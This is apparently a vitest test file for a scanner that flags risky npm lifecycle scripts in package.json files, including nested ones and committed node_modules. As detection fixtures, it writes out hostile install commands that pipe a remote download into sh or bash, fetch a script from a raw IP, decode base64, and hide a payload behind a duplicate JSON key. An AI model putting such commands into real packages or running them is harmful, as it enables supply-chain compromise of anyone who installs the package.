import { describe, expect, test } from 'vitest';
import { installScriptRules } from '../../../src/engine/rules/installScripts';
import { ctx, vf } from '../load';

const run = (files: ReturnType<typeof vf>[]) => installScriptRules.flatMap((r) => r(files, ctx));
const ids = (files: ReturnType<typeof vf>[]) => run(files).map((f) => `${f.ruleId}:${f.severity}`);
const pkg = (scripts: Record<string, string>, path = 'package.json') => vf(path, JSON.stringify({ name: 'x', scripts }, null, 2));

describe('scripts.lifecycle', () => {
  test.each(['preinstall', 'install', 'postinstall', 'prepare'])('%s → caution', (k) => {
    expect(ids([pkg({ [k]: 'husky' })])).toEqual(['scripts.lifecycle:caution']);
  });
  test.each([
    'curl -s http://x/y | sh',
    'wget -qO- x | bash',
    'node -e "require(1)"',
    'echo aGk= | base64 -d',
    'node scripts/.cache/setup.js',
    'node http://10.1.2.3/x.js',
  ])('%s → critical', (cmd) => expect(ids([pkg({ postinstall: cmd })])).toEqual(['scripts.lifecycle:critical']));

  test('non-lifecycle scripts are ignored, even with signals', () => {
    expect(ids([pkg({ build: 'curl x | sh', test: 'vitest run', start: 'node -e 1' })])).toEqual([]);
  });
  test('applies to every package.json in the tree, including nested and committed node_modules', () => {
    const r = run([pkg({ postinstall: 'curl x | sh' }, 'packages/a/package.json'), pkg({ install: 'node-gyp rebuild' }, 'node_modules/dep/package.json')]);
    expect(r.map((f) => `${f.location?.file}:${f.severity}`).sort()).toEqual(['node_modules/dep/package.json:caution', 'packages/a/package.json:critical']);
  });
  test('reports the line of the script', () => {
    expect(run([pkg({ build: 'tsc', postinstall: 'husky' })])[0]?.location).toEqual({ file: 'package.json', line: 5 });
  });
  test('no scripts, or a non-string script → nothing', () => {
    expect(ids([vf('package.json', '{"name":"x"}'), vf('a/package.json', '{"scripts":{"postinstall":42}}')])).toEqual([]);
  });
  test('unparseable package.json is not clean', () => {
    expect(ids([vf('package.json', '{ "scripts": ')])).toEqual(['config.unparseable:caution']);
  });
  test('a duplicate key cannot hide the payload (npm uses the last one)', () => {
    expect(ids([vf('package.json', '{"scripts":{"postinstall":"husky","postinstall":"curl x | sh"}}')]).sort()).toEqual(['scripts.lifecycle:caution', 'scripts.lifecycle:critical']);
  });
  test('prototype-pollution style keys are harmless', () => {
    expect(() => run([vf('package.json', '{"scripts":{"__proto__":{"postinstall":"x"},"postinstall":"husky"}}')])).not.toThrow();
  });
});
